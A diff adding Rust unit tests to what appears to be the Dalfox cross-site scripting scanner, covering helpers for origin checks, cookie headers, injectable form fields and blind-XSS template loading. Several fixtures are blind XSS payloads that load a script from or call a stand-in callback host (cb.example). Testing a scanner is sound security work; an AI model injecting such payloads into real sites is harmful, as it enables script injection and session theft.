@@ -394,3 +394,163 @@ async fn test_blind_scanning_sends_requests_for_query_body_header_and_cookie() {
             || r.headers.values().any(|v| v.contains("cb.example"))
     }));
 }
+
+// ── pure-helper unit tests ──────────────────────────────────────────
+
+#[test]
+fn location_of_maps_param_types_to_wire_locations() {
+    assert_eq!(location_of("query"), "Query");
+    assert_eq!(location_of("body"), "Body");
+    assert_eq!(location_of("header"), "Header");
+    // Cookies fold into the Header location (a cookie side-channel POC).
+    assert_eq!(location_of("cookie"), "Header");
+    // Unknown tags map to the empty string rather than panicking.
+    assert_eq!(location_of("unknown"), "");
+}
+
+#[test]
+fn is_same_origin_compares_scheme_host_and_port() {
+    let parse = |s: &str| url::Url::parse(s).unwrap();
+    assert!(is_same_origin(
+        &parse("https://a.example/x"),
+        &parse("https://a.example/y?z=1")
+    ));
+    // Default port is equivalent to the explicit default port.
+    assert!(is_same_origin(
+        &parse("https://a.example/"),
+        &parse("https://a.example:443/")
+    ));
+    // Scheme, host, and port differences each break same-origin.
+    assert!(!is_same_origin(
+        &parse("https://a.example/"),
+        &parse("http://a.example/")
+    ));
+    assert!(!is_same_origin(
+        &parse("https://a.example/"),
+        &parse("https://b.example/")
+    ));
+    assert!(!is_same_origin(
+        &parse("https://a.example/"),
+        &parse("https://a.example:8443/")
+    ));
+}
+
+#[test]
+fn build_cookie_header_joins_pairs_or_returns_none() {
+    assert_eq!(build_cookie_header(&[]), None);
+    let cookies = vec![
+        ("a".to_string(), "1".to_string()),
+        ("b".to_string(), "2".to_string()),
+    ];
+    assert_eq!(build_cookie_header(&cookies).as_deref(), Some("a=1; b=2"));
+}
+
+fn injectable(html: &str, selector: &str) -> bool {
+    let frag = scraper::Html::parse_fragment(html);
+    let sel = scraper::Selector::parse(selector).expect("valid selector");
+    let el = frag.select(&sel).next().expect("element present");
+    is_injectable_input(&el)
+}
+
+#[test]
+fn is_injectable_input_accepts_text_bearing_fields() {
+    assert!(injectable("<textarea></textarea>", "textarea"));
+    assert!(injectable("<input type=\"text\">", "input"));
+    assert!(injectable("<input type=\"search\">", "input"));
+    assert!(injectable("<input type=\"email\">", "input"));
+    assert!(injectable("<input type=\"password\">", "input"));
+    // Missing type attribute defaults to text.
+    assert!(injectable("<input>", "input"));
+}
+
+#[test]
+fn is_injectable_input_rejects_non_text_fields() {
+    assert!(!injectable("<input type=\"hidden\">", "input"));
+    assert!(!injectable("<input type=\"checkbox\">", "input"));
+    assert!(!injectable("<input type=\"submit\">", "input"));
+    assert!(!injectable("<input type=\"file\">", "input"));
+    // <select> keeps its option choice rather than taking a payload.
+    assert!(!injectable("<select><option>a</option></select>", "select"));
+}
+
+#[test]
+fn build_send_payloads_static_substitutes_callback_url() {
+    let source = CallbackSource::Static("https://cb.example/hook");
+    let out = build_send_payloads(
+        &source,
+        "\"'><script src={}></script>",
+        "https://target.example/",
+        "q",
+        "Query",
+        "GET",
+    );
+    assert_eq!(out.len(), 1, "static source yields exactly one payload");
+    assert_eq!(out[0], "\"'><script src=https://cb.example/hook></script>");
+}
+
+#[test]
+fn build_blind_templates_falls_back_to_builtin_without_path() {
+    let templates = build_blind_templates(None);
+    assert!(!templates.is_empty());
+    assert!(
+        templates.iter().all(|t| t.contains("{}")),
+        "every built-in template keeps the normalized callback marker"
+    );
+}
+
+fn tmp_template_file(name: &str, contents: &str) -> std::path::PathBuf {
+    let nanos = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .expect("system time")
+        .as_nanos();
+    let mut p = std::env::temp_dir();
+    p.push(format!(
+        "dalfox-blind-tmpl-{}-{}-{}",
+        std::process::id(),
+        nanos,
+        name
+    ));
+    std::fs::write(&p, contents).expect("write temp template");
+    p
+}
+
+#[test]
+fn build_blind_templates_reads_custom_lines_and_normalizes_marker() {
+    let p = tmp_template_file(
+        "custom",
+        "# comment\n\n<img src={callback}>\n<svg onload=fetch('{callback}')>\n",
+    );
+    let templates = build_blind_templates(Some(p.to_str().unwrap()));
+    let _ = std::fs::remove_file(&p);
+    assert_eq!(templates.len(), 2, "comments and blank lines are dropped");
+    assert_eq!(templates[0], "<img src={}>");
+    assert!(templates[1].contains("{}"));
+    assert!(templates.iter().all(|t| !t.contains("{callback}")));
+}
+
+#[test]
+fn build_blind_templates_drops_lines_without_callback_marker() {
+    // Lines missing {callback} are skipped; the one valid line survives.
+    let p = tmp_template_file("mixed", "<img src=x>\n<b>{callback}</b>\n");
+    let templates = build_blind_templates(Some(p.to_str().unwrap()));
+    let _ = std::fs::remove_file(&p);
+    assert_eq!(templates, vec!["<b>{}</b>".to_string()]);
+}
+
+#[test]
+fn build_blind_templates_falls_back_when_no_usable_lines() {
+    let p = tmp_template_file("nouse", "no placeholder here\nanother bad line\n");
+    let templates = build_blind_templates(Some(p.to_str().unwrap()));
+    let _ = std::fs::remove_file(&p);
+    // No usable line → built-in fallback (which carries the {} marker).
+    assert!(!templates.is_empty());
+    assert!(templates.iter().all(|t| t.contains("{}")));
+}
+
+#[test]
+fn build_blind_templates_falls_back_when_file_unreadable() {
+    let templates = build_blind_templates(Some("/dalfox/no/such/blind/template.txt"));
+    assert!(!templates.is_empty(), "unreadable path falls back to built-in");
+    assert!(templates.iter().all(|t| t.contains("{}")));
+}
+
